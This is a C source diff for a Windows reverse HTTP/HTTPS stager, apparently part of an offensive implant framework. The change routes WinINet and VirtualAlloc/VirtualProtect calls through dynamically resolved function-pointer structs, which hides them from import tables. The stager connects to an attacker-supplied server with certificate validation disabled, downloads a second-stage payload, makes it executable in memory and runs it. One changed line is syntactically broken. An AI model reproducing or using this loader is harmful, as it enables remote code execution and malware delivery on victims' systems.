@@ -41,7 +41,7 @@ void genURL(char* FullURL, int urlLenght) {
 	return;
 }
 
-BOOL StagerReverseHttpOrHttps(WCHAR* ServeurIP, int Port,BOOL isHTTPS) {
+BOOL StagerReverseHttpOrHttps(Kernel32_API kernel32,Wininet_API wininet,WCHAR* ServeurIP, int Port,BOOL isHTTPS) {
 	HINTERNET hInternetOpen;
 	HINTERNET hInternetConnect;
 	HINTERNET hInternetRequest;
@@ -57,33 +57,33 @@ BOOL StagerReverseHttpOrHttps(WCHAR* ServeurIP, int Port,BOOL isHTTPS) {
 	const char HttpHeader[] = "Mozilla/5.0 (Windows N WOW64; rv:11.0) Gecko Firefox/11.0";
 	genURL(FullURL, urlLenght);
 
-	hInternetOpen = InternetOpenA(HttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+	hInternetOpen = wininet.InternetOpenAFHttpHeader, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
 	if (hInternetOpen == NULL) {
 		DisplayError(L"InternetOpenA");
 		return FALSE;
 	}
-	hInternetConnect = InternetConnectW(hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+	hInternetConnect = wininet.InternetConnectWF(hInternetOpen, ServeurIP, (INTERNET_PORT)Port, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
 	if (hInternetConnect == NULL) {
 		DisplayError(L"InternetConnectA");
 		return FALSE;
 	}
-	hInternetRequest = HttpOpenRequestA(hInternetConnect, get, FullURL, NULL, NULL, NULL, flags, 0);
+	hInternetRequest = wininet.HttpOpenRequestAF(hInternetConnect, get, FullURL, NULL, NULL, NULL, flags, 0);
 	if (hInternetRequest == NULL) {
 		DisplayError(L"HttpOpenRequestA");
 		return FALSE;
 	}
 	if (isHTTPS) {
 		DWORD dwSecFlags = SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_WRONG_USAGE | SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_REVOCATION;
-		if (!InternetSetOptionA(hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD))) {
+		if (!wininet.InternetSetOptionAF(hInternetRequest, INTERNET_OPTION_SECURITY_FLAGS, &dwSecFlags, sizeof(DWORD))) {
 			DisplayError(L"InternetSetOptionA");
 			return FALSE;
 		}
 	}
-	if (!HttpSendRequestA(hInternetRequest, NULL, 0, NULL, 0)) {
+	if (!wininet.HttpSendRequestAF(hInternetRequest, NULL, 0, NULL, 0)) {
 		DisplayError(L"HttpSendRequestA");
 		return FALSE;
 	}
-	Stage2Buffer = (char*)VirtualAlloc(0, (4096 * 1024), MEM_COMMIT, PAGE_READWRITE);
+	Stage2Buffer = (char*)kernel32.VirtualAllocF(0, (4096 * 1024), MEM_COMMIT, PAGE_READWRITE);
 	if (Stage2Buffer != NULL) {
 		BOOL bKeepReading = 1;
 		DWORD dwBytesRead = (DWORD)-1;
@@ -91,23 +91,23 @@ BOOL StagerReverseHttpOrHttps(WCHAR* ServeurIP, int Port,BOOL isHTTPS) {
 		DWORD oldProtect = 0;
 
 		while (bKeepReading && dwBytesRead != 0) {
-			bKeepReading = InternetReadFile(hInternetRequest, (Stage2Buffer + dwBytesWritten), 4096, &dwBytesRead);
+			bKeepReading = wininet.InternetReadFileF(hInternetRequest, (Stage2Buffer + dwBytesWritten), 4096, &dwBytesRead);
 			dwBytesWritten += dwBytesRead;
 		}
-		InternetCloseHandle(hInternetRequest);
-		InternetCloseHandle(hInternetConnect);
-		InternetCloseHandle(hInternetOpen);
+		wininet.InternetCloseHandleF(hInternetRequest);
+		wininet.InternetCloseHandleF(hInternetConnect);
+		wininet.InternetCloseHandleF(hInternetOpen);
 		printMsg(STATUS_OK, LEVEL_DEFAULT, "Stage 2 received !\n");
 		// Run Stage 2 
 		if (Stage2Buffer != NULL && Stage2Buffer[0] == 'M' && Stage2Buffer[1] == 'Z') {
 			printMsg(STATUS_OK, LEVEL_DEFAULT, "Running Stage 2\n");
-			VirtualProtect(Stage2Buffer, dwBytesWritten, PAGE_EXECUTE_READWRITE, &oldProtect);
+			kernel32.VirtualProtectF(Stage2Buffer, dwBytesWritten, PAGE_EXECUTE_READWRITE, &oldProtect);
 			(*(void(*)())Stage2Buffer)();
-			VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
+			kernel32.VirtualFreeF(Stage2Buffer, 0, MEM_RELEASE);
 			return TRUE;
 		} else
 			printMsg(STATUS_ERROR, LEVEL_DEFAULT, "Fail");
-		VirtualFree(Stage2Buffer, 0, MEM_RELEASE);
+		kernel32.VirtualFreeF(Stage2Buffer, 0, MEM_RELEASE);
 	}
 	return FALSE;
 }
